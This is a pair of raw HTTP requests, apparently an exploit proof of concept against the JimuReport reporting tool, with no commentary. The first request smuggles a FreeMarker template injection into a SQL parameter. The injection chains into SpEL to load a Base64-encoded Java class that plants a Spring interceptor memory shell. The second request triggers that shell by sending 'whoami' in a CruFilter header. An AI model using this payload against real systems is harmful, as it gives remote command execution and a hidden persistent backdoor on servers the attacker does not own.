
```
POST /jmreport/queryFieldBySql? HTTP/1.1
Host: 192.168.1.103:8033
Content-Length: 7421
JmReport-Tenant-Id: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 kWhJEz
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
X-TIMESTAMP: 1720029467879
X-Sign: F5C9B1E25D807B26D598DFF2A9DBE317
X-Access-Token: null
token: null
Origin: http://192.168.1.103:8033
Referer: http://192.168.1.103:8033/jmreport/index/968539632443658240?menuType=datainfo
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
slD56cr: whoami
EBQlZbd: whoami

{"sql": "select '${x}'", "dbSource": "", "type": "0", "paramArray": "[{\"paramName\": \"x\", \"paramTxt\": \"\", \"orderNum\": 1, \"tableIndex\": 1, \"id\": \"\", \"paramValue\": \"${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"org.springframework.expression.spel.standard.SpelExpressionParser\\\").parseExpression(\\\"{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.springframework.expression.InterceptorMemShell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQA6woAMwB7CAB8CwB9AH4IAH8KAIAAgQoACQCCCACDCgAJAIQHAIUIAIYIAIcIAIgIAIkKAIoAiwoAigCMCgCNAI4HAI8KABEAkAgAkQoAEQCSCgARAJMKABEAlAgAlQsAlgCXCgCYAJkKAJgAmgoAmACbBwCcCgAcAJ0LADQAngsANACfCgCgAKEIAKILAKMApAcApQcApgsAIwCnBwCoCACpCgCqAKsHAKwKACkAnQoArQCuCgCtAK8HALAHALEKAC4AnQcA6QoAMAB7CwAtALMHALQHALUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFUxJbnRlcmNlcHRvck1lbVNoZWxsOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAdpc0xpbnV4AQABWgEABW9zVHlwAQASTGphdmEvbGFuZy9TdHJpbmc7AQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAhQcAQwcAtgcAjwcA6QcAtwcAuAcAtAcAnAEACkV4Y2VwdGlvbnMBABBNZXRob2RQYXJhbWV0ZXJzAQAKcG9zdEhhbmRsZQEAkihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OylWAQAMbW9kZWxBbmRWaWV3AQAuTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAD2FmdGVyQ29tcGxldGlvbgEAeShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9FeGNlcHRpb247KVYBAAJleAEACDxjbGluaXQ+AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAHY29udGV4dAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBABVtYXBwaW5nSGFuZGxlck1hcHBpbmcBAFRMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZzsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABFhZGFwdEludGVyY2VwdG9ycwEAEExqYXZhL3V0aWwvTGlzdDsBAA9ldmlsSW50ZXJjZXB0b3IBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQBGTGphdmEvdXRpbC9MaXN0PExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcjs+OwcApQcApgcAuQcArAcAsAcAsQEAClNvdXJjZUZpbGUBABhJbnRlcmNlcHRvck1lbVNoZWxsLmphdmEMADUANgEACUNydUZpbHRlcgcAtwwAugC7AQAHb3MubmFtZQcAvAwAvQC7DAC+AL8BAAN3aW4MAMAAwQEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwDCDADDAMQMAMUAxgcAxwwAyADJAQARamF2YS91dGlsL1NjYW5uZXIMADUAygEAAlxBDADLAMwMAM0AzgwAzwC/AQAABwC4DADQANEHANIMANMA1AwA1QA2DADWADYBABNqYXZhL2xhbmcvRXhjZXB0aW9uDADXADYMAF4AXwwAYgBjBwDYDADZANoBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHANsMANwA3QEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwA3gDfAQA+b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcBABNhZGFwdGVkSW50ZXJjZXB0b3JzBwDgDADhAOIBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HALkMAOMA5AwA5QDmAQAOamF2YS91dGlsL0xpc3QBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAE0ludGVyY2VwdG9yTWVtU2hlbGwMAOcA6AEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEACWdldEhlYWRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQEAD3ByaW50U3RhY2tUcmFjZQEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXMBAAxnZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL09iamVjdDsBAAdnZXRCZWFuAQAlKExqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAyb3JnL3NwcmluZ2ZyYW1ld29yay9leHByZXNzaW9uL0ludGVyY2VwdG9yTWVtU2hlbGwBADRMb3JnL3NwcmluZ2ZyYW1ld29yay9leHByZXNzaW9uL0ludGVyY2VwdG9yTWVtU2hlbGw7ACEAMAAzAAEANAAAAAUAAQA1ADYAAQA3AAAALwABAAEAAAAFKrcAAbEAAAACADgAAAAGAAEAAAAPADkAAAAMAAEAAAAFADoA6gAAAAEAPAA9AAMANwAAAewABQALAAAAxisSArkAAwIAOgQZBMYAuAQ2BRIEuAAFOgYZBsYAExkGtgAGEge2AAiZAAYDNgUVBZkAHwa9AAlZAxIKU1kEEgtTWQUrEgK5AAMCAFOnABwGvQAJWQMSDFNZBBINU1kFKxICuQADAgBTOge4AA4ZB7YAD7YAEDoIuwARWRkItwASEhO2ABQ6CRkJtgAVmQALGQm2ABanAAUSFzoKLLkAGAEAGQq2ABksuQAYAQC2ABosuQAYAQC2ABunAAo6BRkFtgAdA6wErAABAA8AuAC7ABwAAwA4AAAASgASAAAAJgAKACcADwApABIAKgAZACsAKwAsAC4ALgBqAC8AdwAwAIcAMQCbADIApgAzAK8ANAC4ADcAuwA1AL0ANgDCADgAxAA6ADkAAAB6AAwAEgCmAD4APwAFABkAnwBAAEEABgBqAE4AQgBDAAcAdwBBAEQARQAIAIcAMQBGAEcACQCbAB0ASABBAAoAvQAFAEkASgAFAAAAxgA6AOoAAAAAAMYASwBMAAEAAADGAE0ATgACAAAAxgBPAFAAAwAKALwAUQBBAAQAUgAAADwACP4ALgcAUwEHAFMgWAcAVP4ALgcAVAcAVQcAVkEHAFP/ACEABQcAVwcAWAcAWQcAWgcAUwABBwBbBgEAXAAAAAQAAQAcAF0AAAANAwBLAAAATQAAAE8AAAABAF4AXwADADcAAABgAAUABQAAAAoqKywtGQS3AB6xAAAAAgA4AAAACgACAAAAPwAJAEAAOQAAADQABQAAAAoAOgDqAAAAAAAKAEsATAABAAAACgBNAE4AAgAAAAoATwBQAAMAAAAKAGAAYQAEAFwAAAAEAAEAHABdAAAAEQQASwAAAE0AAABPAAAAYAAAAAEAYgBjAAMANwAAAGAABQAFAAAACiorLC0ZBLcAH7EAAAACADgAAAAKAAIAAABEAAkARQA5AAAANAAFAAAACgA6AOoAAAAAAAoASwBMAAEAAAAKAE0ATgACAAAACgBPAFAAAwAAAAoAZABKAAQAXAAAAAQAAQAcAF0AAAARBABLAAAATQAAAE8AAABkAAAACABlADYAAQA3AAABUQADAAUAAABauAAgEiEDuQAiAwDAACNLKhIkuQAlAgDAACRMAU0SJhIntgAoTacACE4ttgAqLAS2ACsBTiwrtgAswAAtTqcACjoEGQS2AC+7ADBZtwAxOgQtGQS5ADICAFexAAIAHQAlACgAKQA0AD0AQAAuAAQAOAAAAEIAEAAAABEADwASABsAEwAdABUAJQAYACgAFgApABcALQAZADIAGgA0ABwAPQAfAEAAHQBCAB4ARwAgAFAAIQBZACIAOQAAAEgABwApAAQASQBmAAMAQgAFAEkAZwAEAA8ASgBoAGkAAAAbAD4AagBrAAEAHQA8AGwAbQACADQAJQBuAG8AAwBQAAkAcADqAAQAcQAAAAwAAQA0ACUAbgByAAMAUgAAAC0ABP8AKAADBwBzBwB0BwB1AAEHAHYE/wASAAQHAHMHAHQHAHUHAHcAAQcAeAYAAQB5AAAAAgB6'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName('org.springframework.expression.ExpressionParser'))}\\\").getValue()}\", \"extJson\": \"\", \"_index\": 0, \"_rowKey\": \"105\"}]"}
```

```
GET /test/list? HTTP/1.1
Host: 192.168.1.103:8033
Content-Length: 0
JmReport-Tenant-Id: null
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 kWhJEz
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
X-TIMESTAMP: 1720029467879
X-Sign: F5C9B1E25D807B26D598DFF2A9DBE317
X-Access-Token: null
token: null
Origin: http://192.168.1.103:8033
Referer: http://192.168.1.103:8033/jmreport/index/968539632443658240?menuType=datainfo
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
CruFilter: whoami


```
